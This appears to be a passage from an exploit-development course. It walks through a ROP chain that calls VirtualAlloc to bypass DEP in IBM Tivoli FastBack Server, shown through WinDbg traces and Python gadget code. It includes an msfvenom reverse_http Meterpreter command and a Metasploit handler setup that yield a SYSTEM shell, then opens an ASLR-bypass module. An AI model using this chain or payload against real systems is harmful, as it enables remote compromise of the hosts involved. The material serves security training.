*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
eax=00000040 ebx=05f6b8f0 ecx=7f7f7fc0 edx=77071670 esi=0d28e314 edi=00000000
eip=5051e4db esp=0d28e41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0xd63d:
5051e4db cc              int     3
```

`dds esi - 14 L6`

```
0d28e300  76da38c0 KERNEL32!VirtualAllocStub
0d28e304  0d28e514
0d28e308  0d28e514
0d28e30c  00000001
0d28e310  00001000
0d28e314  00000040
```

Listing 74 - Full ROP chain executed

From the output of Listing 74, we notice that all the arguments are set up correctly and that our trick of using a breakpoint gadget worked. Remember, if we forget to remove this gadget in the final exploit, it will cause an access violation.

We have finally laid out all the work needed before invoking VirtualAlloc. In the next section, we can move forward to the last stage and finally disable DEP.

Two's_complement#:~:text=Two's complement,with respect to 2N

### Executing VirtualAlloc

The ROP chain to set up the address for VirtualAlloc, the return address, and all four arguments has been created and verified to work. The only step that remains to bypass DEP is to invoke the API.
To execute VirtualAlloc, we must add a few more ROP gadgets so we can return to the API address we wrote on the stack. Additionally, the return address we wrote onto the stack will only be used if the stack pointer is correctly aligned.

Sadly, there is no simple way to modify ESP, so we must take a small detour. The only useful gadget we found for this task is a MOV ESP, EBP ; POP EBP ; RET. However, in order to use it, we need to align EBP to the address of VirtualAlloc on the stack.

When the ROP chain is finished patching the arguments for VirtualAlloc, ESI will contain the stack address of the last argument (flProtect). To obtain the stack address where VirtualAlloc was patched, we can move the contents of ESI into EAX and subtract a small value from it.
Any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. Instead of subtracting a small value that contains null bytes, we can add a large value. This will allow us to align EAX with the VirtualAlloc address on the stack.

Once EAX contains the correct address, we move its content into EBP through an XCHG EAX, EBP; RET gadget. Finally, we can move the contents of EBP into ESP with the gadget we initially found.

The gadget that moves EBP into ESP has a side effect of popping a value into EBP. We must compensate for this and configure the stack so that a dummy DWORD just before the VirtualAlloc address is popped into EBP.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe8)) # negative offset value
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051571f)) # xchg eax, ebp ; ret
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret
rop += b"C" * (0x400 - 276 - 4 - len(rop))
```

Listing 75 - Aligning ESP for VirtualAlloc execution

Through trial and error, we find that we want to subtract 0x18 bytes from EAX to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes.

Note that the ROP gadget containing the breakpoint instruction must be removed from the updated ROP chain.

The first gadget in the newly added part of the ROP chain is used four times. To break directly on the fourth occurrence, we can leverage the fact that this part of the ROP chain comes just after patching flProtect on the stack.

This means EAX contains the value 0x40 to indicate readable, writable, and executable memory. We can use this to set a conditional breakpoint at 0x5050118e and only trigger it if EAX contains the value 0x40.
Listing 76 shows execution of the first half of the ROP chain.

0:006> bp 0x5050118e ".if @eax = 0x40 {} .else {gc}"
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 

`g`

```
eax=00000040 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000
eip=5050118e esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6+0x118e:
5050118e 8bc6            mov     eax,esi
```

`p`

```
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=0d4ae314 edi=00000000
eip=50501190 esp=0d4ae41c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6+0x1190:
50501190 5e              pop     esi
```

`p`

```
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000
eip=50501191 esp=0d4ae420 ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6+0x1191:
50501191 c3              ret
```

`p`

```
eax=0d4ae314 ebx=0601b758 ecx=7f7f7fc0 edx=77251670 esi=42424242 edi=00000000
eip=505115a3 esp=0d4ae424 ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x705:
505115a3 59              pop     ecx
```

`p`

```
eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=505115a4 esp=0d4ae428 ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x706:
505115a4 c3              ret
```

`p`

```
eax=0d4ae314 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=5051579a esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
CSFTPAV6!FtpUploadFileW+0x48fc:
5051579a 03c1            add     eax,ecx
```

`p`

```
eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=5051579c esp=0d4ae42c ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x48fe:
5051579c c3              ret
```

`dds eax L2`

```
0d4ae2fc  41414141
0d4ae300  75f238c0 KERNEL32!VirtualAllocStub
```

Listing 76 - ROP chain to align EAX

By looking at the above listing, we find that our trick of subtracting a large negative value from EAX resulted in EAX containing the stack address four bytes prior to VirtualAlloc.

This is expected and intended since the gadget that moves EBP into ESP contains a "POP EBP" instruction, which increments the stack pointer by four bytes. This is why we aligned EAX to point four bytes before the VirtualAlloc address.

Listing 77 shows the second half of the ROP chain, which executes VirtualAlloc.

`p`

```
eax=0d4ae2fc ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=5051571f esp=0d4ae430 ebp=51515151 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x4881:
5051571f 95              xchg    eax,ebp
```

`p`

```
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=50515720 esp=0d4ae430 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x4882:
50515720 c3              ret
```

`p`

```
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=50533cbf esp=0d4ae434 ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x22e21:
50533cbf 8be5            mov     esp,ebp
```

`p`

```
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=50533cc1 esp=0d4ae2fc ebp=0d4ae2fc iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x22e23:
50533cc1 5d              pop     ebp
```

`p`

```
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=50533cc2 esp=0d4ae300 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
CSFTPAV6!FtpUploadFileW+0x22e24:
50533cc2 c3              ret
```

`p`

```
eax=51515151 ebx=0601b758 ecx=ffffffe8 edx=77251670 esi=42424242 edi=00000000
eip=75f238c0 esp=0d4ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
KERNEL32!VirtualAllocStub:
75f238c0 8bff            mov     edi,edi
```

Listing 77 - ROP chain to invoke VirtualAlloc

Fortunately, we find that ESP is aligned correctly with the API skeleton call, which allows us to return into VirtualAlloc.

Let's check the memory protections of the shellcode address before and after executing the API.

`dds esp L1`

```
0d55e304  0d55e514
```

`!vprot 0d55e514`

```
BaseAddress:       0d55e000
AllocationBase:    0d4c0000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00062000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
```

`pt`

```
eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000
eip=73be2623 esp=0d55e304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x53:
73be2623 c21000          ret     10h
```

`!vprot 0d55e514`

```
BaseAddress:       0d55e000
AllocationBase:    0d4c0000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000040  PAGE_EXECUTE_READWRITE
Type:              00020000  MEM_PRIVATE
```

Listing 78 - Turning off DEP by executing VirtualAlloc

Before executing the API, we find that the memory protection is PAGE_READWRITE. But after executing the API, we observe that it is now the desired PAGE_EXECUTE_READWRITE.

The final step required is to align our shellcode with the return address. Instead of modifying the offsets used in the ROP chain, we could also insert several padding bytes before the shellcode.
To find the number of padding bytes we need, we return out of VirtualAlloc and obtain the address of the first instruction we are executing on the stack. Next, we dump the contents of the stack and obtain the address of where our ROP chain ends in order to obtain its address and calculate the difference between the two.

`p`

```
eax=0d55e000 ebx=0602b578 ecx=0d55e2d4 edx=77071670 esi=42424242 edi=00000000
eip=0d55e514 esp=0d55e318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d55e514 43              inc     ebx
```

`dd esp + 100`

```
0d55e418  5050118e 42424242 505115a3 ffffffe8
0d55e428  5051579a 5051571f 50533cbf 43434343
0d55e438  43434343 43434343 43434343 43434343
0d55e448  43434343 43434343 43434343 43434343
0d55e458  43434343 43434343 43434343 43434343
0d55e468  43434343 43434343 43434343 43434343
0d55e478  43434343 43434343 43434343 43434343
0d55e488  43434343 43434343 43434343 43434343
```

`? 0d55e514  - 0d55e434`

```
Evaluate expression: 224 = 000000e0
```

Listing 79 - Finding the offset to the shellcode

The calculation indicates we need 224 bytes of padding. Now we can update the proof of concept to include padding and a dummy shellcode after the ROP chain. This will help us verify that everything is setup correctly before including the real payload. These changes are reflected in the listing below.

```python
rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
...
rop += pack("<L", (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret

padding = b"C" * 0xe0

shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+va+eip+rop+padding+shellcode,0,0,0,0)
buf += formatString
```

Listing 80 - Dummy shellcode placed at correct offset

At this point, everything is aligned and we can execute the dummy shellcode by single-stepping through it.

`bp KERNEL32!VirtualAllocStub`

`g`

```
Breakpoint 0 hit
eax=51515151 ebx=061db070 ecx=ffffffe8 edx=77401670 esi=42424242 edi=00000000
eip=74ff38c0 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl nz na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207
KERNEL32!VirtualAllocStub:
74ff38c0 8bff            mov     edi,edi
```

`pt`

```
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL - 
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
eip=749e2623 esp=0d5ae304 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!VirtualAlloc+0x53:
749e2623 c21000          ret     10h
```

`p`

```
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
eip=0d5ae514 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d5ae514 cc              int     3
```

`p`

```
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
eip=0d5ae515 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d5ae515 cc              int     3
```

`p`

```
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
eip=0d5ae516 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d5ae516 cc              int     3
```

`p`

```
eax=0d5ae000 ebx=061db070 ecx=0d5ae2d4 edx=77401670 esi=42424242 edi=00000000
eip=0d5ae517 esp=0d5ae318 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
0d5ae517 cc              int     3
```

Listing 81 - Executing dummy shellcode

The execution on the stack doesn't trigger any access violation. Congratulations, we succeeded in using ROP to bypass DEP!
The final step is to replace the dummy shellcode with real reverse shellcode and obtain a remote shell, which we will do in the next section.

### Getting a Reverse Shell

Now that everything is prepared, let's replace the dummy shellcode with a reverse Meterpreter shellcode.

First, let's determine how much space we have available for our shellcode. When VirtualAlloc completes execution and we return into our dummy shellcode, we can dump memory at EIP to find the exact amount of space available, as given in Listing 82:

`dd eip L40`

```
0d5ae514  cccccccc cccccccc cccccccc cccccccc
0d5ae524  cccccccc cccccccc cccccccc cccccccc
0d5ae534  cccccccc cccccccc cccccccc cccccccc
0d5ae544  cccccccc cccccccc cccccccc cccccccc
0d5ae554  cccccccc cccccccc cccccccc cccccccc
0d5ae564  cccccccc cccccccc cccccccc cccccccc
0d5ae574  cccccccc cccccccc cccccccc cccccccc
0d5ae584  cccccccc cccccccc cccccccc cccccccc
0d5ae594  cccccccc cccccccc cccccccc cccccccc
0d5ae5a4  cccccccc cccccccc cccccccc cccccccc
0d5ae5b4  cccccccc cccccccc cccccccc cccccccc
0d5ae5c4  cccccccc cccccccc cccccccc cccccccc
0d5ae5d4  cccccccc cccccccc cccccccc cccccccc
0d5ae5e4  cccccccc cccccccc cccccccc cccccccc
0d5ae5f4  cccccccc cccccccc cccccccc cccccccc
0d5ae604  00000000 00000000 00000000 00000000
```

`? 0d5ae604 - eip`

```
Evaluate expression: 240 = 000000f0
```

Listing 82 - Calculating available shellcode space

We only have 240 bytes available, which is likely not enough for a reverse shellcode.

Luckily, we have the freedom to increase the buffer size. If we increase it from 0x400 to 0x600 bytes, we can compensate for a larger payload size.

We use msfvenom to generate the shellcode, remembering to supply the bad characters with the -b option.

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.120 LPORT=8080 -b "\x00\x09\x0a\x0b\x0c\x0d\x20" -f python -v shellcode
```

From the highlighted payload size in Listing 83, we find that, due to the encoding, the shellcode takes up 544 bytes.

Now, we just need to insert the shellcode into the proof of concept, and we have our final exploit code. Before we execute the complete exploit, we will set up a Metasploit multi/handler listener to catch our shell.

```
use multi/handler
set payload windows/meterpreter/reverse_http
set lhost 192.168.119.120
set lport 8080
exploit
```

The exploit was successful, and we have obtained a SYSTEM integrity Meterpreter shell while using ROP to bypass DEP!
Using ROP as part of an exploit is tricky at first and requires experience. To get that experience, it's best to begin by performing all the steps manually instead of relying on automated tools.
In addition, for the more complex ROP chains we will encounter later, there are no automated tools that work.

## Extra Mile

### Extra Mile 1

Throughout this module, we used CSFTPAV6.DLL as the source for our ROP gadgets. We chose this because it did not contain any null bytes and had no ASLR mitigation protection.

Using the !nmod command from the Narly WinDbg extension, locate a different module that fulfills the same requirements, and then use that module to build the ROP chain.

### Extra Mile 2

In the Reverse Engineering For Bugs module, we located a vulnerability in the parsing of the `psAgentCommand` size fields that led to control over EIP through an SEH overwrite.

Reuse the proof of concept code for the vulnerability and expand it into a full exploit that bypasses DEP and yields a reverse shell.

### Extra Mile 3

Note: This Extra Mile requires you to have solved the last Extra Mile exercise in the Reverse Engineering For Bugs module.
Multiple vulnerabilities are present in the Faronics Deep Freeze Enterprise Server application, some of which are also stack buffer overflows. Select one of these vulnerabilities and create an exploit for it that bypasses DEP, through the use of VirtualAlloc or VirtualProtect.

Remember to use the !nmod command from the Narly extension to locate modules not protected by the ASLR mitigation. Use one of these modules to locate gadgets.

Hint: When null bytes are present in a module, sometimes it is possible to overcome them by thinking creatively.

# Stack Overflows and ASLR Bypass

As discussed in previous modules, Data Execution Prevention (DEP) bypass is possible due to the invention and adoption of Return Oriented Programming (ROP). Due to the invention of ROP, operating system developers introduced Address Space Layout Randomization (ASLR) as an additional mitigation technique.
In this module, we'll explore how ASLR and DEP work together to provide effective mitigation against a variety of exploits. We'll also demonstrate an ASLR bypass with a custom-tailored case study and develop an exploit leveraging the ASLR bypass combined with a DEP bypass through the Win32 WriteProcessMemory API.
10.1. ASLR Introduction
ASLR was first introduced by the Pax Project1 in 2001 as a patch for the Linux operating system. It was integrated into Windows in 2007 with the launch of Windows Vista.
ROP evolved over time to make many basic stack buffer overflow vulnerabilities, previously considered un-exploitable because of DEP, exploitable. The goal of ASLR was to mitigate exploits that defeat DEP with ROP.
At a high level, ASLR defeats ROP by randomizing an EXE or DLL's loaded address each time the application starts. In the next sections, we'll examine how Windows implements ASLR and in later sections we'll discuss various bypass techniques.
1 (Wikipedia, 2020), https://en.wikipedia.org/wiki/PaX
10.1.1. ASLR Implementation
To fully describe how Windows implements ASLR, we must briefly discuss basic executable file compilation theory.
When compiling an executable, the compiler accepts a parameter called the preferred base address (for example 0x10000000), which sets the base memory address of the executable when it is loaded.
We should also take note of a related compiler flag called /REBASE, which if supplied, allows the loading process to use a different loading address. This flag is relevant if two DLLs were compiled with the same preferred base address and loaded into the same process.
If, as in our example, the first module uses 0x10000000, the operating system will provide an alternative base address for the second module. This is not a security mechanism, but merely a feature to avoid address collision.
To enable ASLR, a second compiler flag, /DYNAMICBASE must be set. This is set by default in modern versions of Visual Studio, but may not be set in other IDEs or compilers.
Now that we've discussed how ASLR is enabled, let's discuss how it works.
Within Windows, ASLR is implemented in two phases. First, when the operating system starts, the native DLLs for basic SYSTEM processes load to randomized base addresses. Windows will automatically avoid collisions by rebasing modules as needed. The addresses selected for these native modules are not changed until the operating system restarts.
Next, when an application is started, any ASLR-enabled EXE and DLLs that are used are allocated to random addresses. If this includes a DLL loaded at boot as part of a SYSTEM process, its existing address is reused within this new application.
It is important to note that ASLR's randomization does not affect all the bits of the memory base address. Instead, only 8 of the 32 bits are randomized when a base address is chosen.1 In technical terms, this is known as the amount of entropy2 applied to the memory address. The higher 8 bits and the lower 16 bits always remain static when an executable loads.
On 64-bit versions of Windows, ASLR has a larger entropy (up to 19 bits) and is therefore considered to be more effective.
Armed with a basic understanding of ASLR implementation, let's discuss ASLR bypasses.
1 (BlackHat, 2012), https://media.blackhat.com/bh-us-12/Briefings/M_Miller/BH_US_12_Miller_Exploit_Mitigation_Slides.pdf
2 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Address_space_layout_randomization
10.1.2. ASLR Bypass Theory
There are four main techniques for bypassing ASLR; we could either exploit modules that are compiled without ASLR, exploit low entropy, brute force a base address, or leverage an information leak. In this section, we'll discuss each of these approaches.
The first technique mentioned above is the simplest. As previously mentioned, ASLR must be enabled for each module during compilation. If an EXE or DLL is compiled without ASLR support, its image will be loaded to its preferred base address, provided that there are no collision issues. This means that, in these cases, we can locate gadgets for our ROP chain in an unprotected module and leverage that module to bypass DEP.
Many third-party security solutions attempt to protect processes by injecting monitoring routines into them. Ironically, quite a few of these products have historically injected DLLs that were compiled without ASLR, thus effectively lowering the application's security posture.
We can easily determine whether a module is compiled with ASLR by searching for the /DYNAMICBASE bit inside the DllCharacteristics field of the PE header. Let's demonstrate this with the Narly WinDbg.
As an example, let's start Notepad.exe and attach WinDbg. Listing 1 shows the output received when we execute the !nmod command.
0:006> .load narly
...

0:006> !nmod
00850000 0088f000 notepad              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\notepad.exe
674a0000 674f6000 oleacc               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\oleacc.dll
68e60000 68ed6000 efswrt               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\efswrt.dll
69d70000 69ddc000 WINSPOOL             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\WINSPOOL.DRV
6a600000 6a617000 MPR                  /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MPR.dll
6ba10000 6baf3000 MrmCoreR             /SafeSEH ON  /GS *ASLR *DEP C:\Windows\System32\MrmCoreR.dll
6d3d0000 6d55c000 urlmon               /SafeSEH ON  /GS *ASLR *DEP C:\Windows\system32\urlmon.dll
...
Listing 1 - Listing ASLR support for loaded modules
The output of the Narly plugin shows that by default, the modules used in Notepad have all been compiled with ASLR. This is true of most native Windows applications.
Many early ASLR bypasses leveraged non-ASLR modules. This was even effective against browsers due to the widespread presence of Java version 6, which contained a DLL compiled without ASLR (msvcr71.dll).
Today, most major applications use ASLR-compiled modules. However, unprotected modules are more common in less-popular applications and in-house applications.
A second ASLR bypass technique leverages low entropy. In these cases, since the lower 16 bits of a memory address are non-randomized, we may be able to perform a partial overwrite of a return address while exploiting a stack overflow condition.
This technique leverages the fact that the CPU reads the address of an instruction in little-endian format, while data is often read and written in big-endian format.
For example, assume 0x7F801020 is a hypothetical return address for a function vulnerable to a buffer overflow. Although the address would be stored on the stack as the bytes 0x20, 0x10, 0x80, 0x7F, in that order, the CPU would read the address as 0x7F801020.
Imagine that we are able to leverage a buffer overflow where the ESP register points to our payload on the stack. In addition, let's assume we found a JMP ESP instruction within the same DLL the vulnerable function belongs to, at address 0x7F801122.
If we control the overflow in such a way that we overwrite only the first two bytes of the return address with the values 0x11 and 0x22, the CPU will process the partially-overwritten address as 0x7F801122. This would effectively transfer the execution to our JMP ESP when the function returns, eventually running our shellcode.
Although interesting, this ASLR bypass has some limitations. First, as already mentioned, we'd need to redirect the execution to an instruction or gadget within the same DLL the return address belongs to. In addition, because we only perform a partial overwrite of the return address, we're limited to that single gadget, meaning our buffer overflow would halt immediately after executing it. Finally, to be effective, this technique also requires that the target application is compiled with ASLR, but without DEP, which is rare.
Another ASLR bypass approach is to brute force the base address of a target module. This is possible on 32-bit because ASLR provides only 8 bits of entropy. The main limitation is that this only works for target applications that don't crash when encountering an invalid ROP gadget address or in cases in which the application is automatically restarted after the crash.
If the application does not crash, we can brute force the base address of a target module in (at most) 256 attempts. If the application is restarted, it may take more attempts to succeed, but the attack is still feasible.
As an example, let's consider a stack buffer overflow in a web server application. Imagine that every time we submit a request, a new child process is created. If we send our exploit and guess the ROP gadget's base address incorrectly, the child process crashes, but the main web server does not. This means we can submit further requests until we guess correctly.
Although this technique theoretically works against 32-bit applications, it is considered a special case and is ineffective in many situations. Nevertheless, this technique can still be useful, and we'll demonstrate a variant of it later in this module.
The fourth and final technique we'll cover, which is used in many modern exploits, leverages an information leak (or "info leak"). In simple terms, this technique leverages one or more vulnerabilities in the application to leak the address of a loaded module.
Info leaks are often created by exploiting a separate vulnerability (like a logic bug) that discloses memory or information but does not permit code execution. Once we have bypassed ASLR by leaking a module's address, we could leverage another vulnerability such as a stack buffer overflow to gain code execution while bypassing DEP through a ROP chain.
In addition, there are certain types of vulnerabilities (such as format string vulnerabilities) that can be leveraged to both trigger an info leak and execute code.
In this section, we explored four theoretical techniques for bypassing ASLR. Next, we'll discuss how to implement some of them.
10.1.3. Windows Defender Exploit Guard and ASLR
In this module, we are going to revisit the FastBackServer application and expand and improve on an exploit from a previous module.
Note that if your Windows 10 machine has been reverted, you must re-install FastBackServer before continuing.
Let's start by attaching WinDbg to FastBackServer. We'll use Narly to find information related to compiled security mitigations.
0:078> !nmod
00190000 001c3000 snclientapi          /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\snclientapi.dll
001d0000 001fd000 libcclog             /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\libcclog.dll
00400000 00c0c000 FastBackServer       /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\FastBackServer.exe
011e0000 0120b000 gsk8iccs             /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\gsk8iccs.dll
01340000 01382000 NLS                  /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\Common\NLS.dll
01390000 013ca000 icclib019            /SafeSEH ON  /GS            C:\Program Files\ibm\gsk8\lib\N\icc\icclib\icclib019.dll
03170000 03260000 libeay32IBM019       /SafeSEH OFF                C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll
10000000 1003d000 SNFS                 /SafeSEH OFF                C:\Program Files\Tivoli\TSM\FastBack\server\SNFS.dll
50200000 50237000 CSNCDAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSNCDAV6.DLL
50500000 50577000 CSFTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSFTPAV6.DLL
51000000 51032000 CSMTPAV6             /SafeSEH ON  /GS            C:\Program Files\Tivoli\TSM\FastBack\server\CSMTPAV6.DLL
57a40000 57ae3000 MSVCR90              /SafeSEH ON  /GS *ASLR *DEP 
62830000 62866000 IfsUtil              /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\IfsUtil.dll
63550000 63577000 ulib                 /SafeSEH ON  /GS *ASLR *DEP C:\Windows\SYSTEM32\ulib.dll
...
Listing 2 - Lack of ASLR in FastBackServer
We find that neither the main executable nor any of the IBM DLLs are compiled with ASLR, as shown in Listing 2.
To learn more about how to bypass DEP and ASLR, we are going to use Windows Defender Exploit Guard (WDEG) to enable these mitigations for the IBM target executable and DLLs.
Introduced in the Windows 10 Creators Update, WDEG enables the enforcement of additional security mitigations such as DEP and ASLR, even if they were not intended by the developer.
To use WDEG, we'll search for and open Windows Defender Security Center, as displayed in Figure 1.
 
Figure 1: Searching for Windows Defender Security Center
In the new window, we can open App & browser control, scroll to the bottom, and click Exploit protection settings to open the main WDEG window.
 
Figure 2: WDEG main Window
To select mitigations for a single application, we'll click the Program settings tab, click Add program to customize, and select Choose exact file path, as shown in Figure 3.
 
Figure 3: Selecting application to protect
In the file dialog window, we'll navigate to C:\Program Files\Tivoli\TSM\FastBack\server and select FastBackServer.exe. In the new settings menu, we'll scroll down and enable "Data Execution Prevention (DEP)" by checking Override system settings:
 
Figure 4: Enabling DEP for FastBackServer
Next, we'll scroll down to "Force randomization for images (Mandatory ASLR)" and enable it by checking Override system settings and turning it On, as shown in Figure 5.
 
Figure 5: Enabling ASLR for FastBackServer
Finally, we'll accept the settings and restart the FastBackServer to enable our changes.
Because Narly only presents information parsed from the DllCharacteristics field of the PE header of the modules, rerunning it would not show that DEP and ASLR were enabled.
To manually verify that ASLR is enabled, we can dump the base address of the loaded modules using the lm command and note the addresses. Once we restart the service, reattach WinDbg, and dump the base address of the loaded modules again, we can note if the base addresses have changed.
As an example, we'll select the csftpav6 module. Listing 3 shows the loaded base address of csftpav6.dll across three application restarts performed in separate WinDbg instances.
0:077> lm m csftpav6
Browse full module list
start    end        module name
01050000 010c7000   CSFTPAV6   (deferred)  

0:079> lm m csftpav6
Browse full module list
start    end        module name
01130000 011a7000   CSFTPAV6   (deferred)  

0:066> lm m csftpav6
Browse full module list
start    end        module name
01060000 010d7000   CSFTPAV6   (deferred) 
Listing 3 - Base address of csftpav6 across restart
This confirms that our ASLR enforcement was successfully implemented, meaning that our exploit must now effectively bypass ASLR.
When forcing ASLR with WDEG, it is not applied to the main executable, in our case FastBackServer.exe. However, because FastBackServer.exe loads at a preferred base address containing a NULL byte, we cannot use it with memory corruption vulnerabilities for which NULL bytes are bad characters.
Exercises
1.	Verify that ASLR is not enabled for the IBM DLLs.
2.	Use WDEG to force ASLR protection on all modules in the FastBackServer process, as shown in this section.
10.2. Finding Hidden Gems
Info leaks are often discovered through a logical vulnerability or through memory corruption, the latter of which enables the reading of unintended memory, such as out-of-bounds stack memory.
Discovering a vulnerability that can be leveraged as an info leak usually requires copious reverse engineering, but we can speed up our analysis through educated guesses and various searches.
Our aim in this module is to exploit a logical vulnerability in the FastBackServer application. The most comprehensive approach for discovering a vulnerability would be to reverse engineer the code paths for each valid opcode inside the huge FXCLI_OraBR_Exec_Command function, which we located in a prior module.
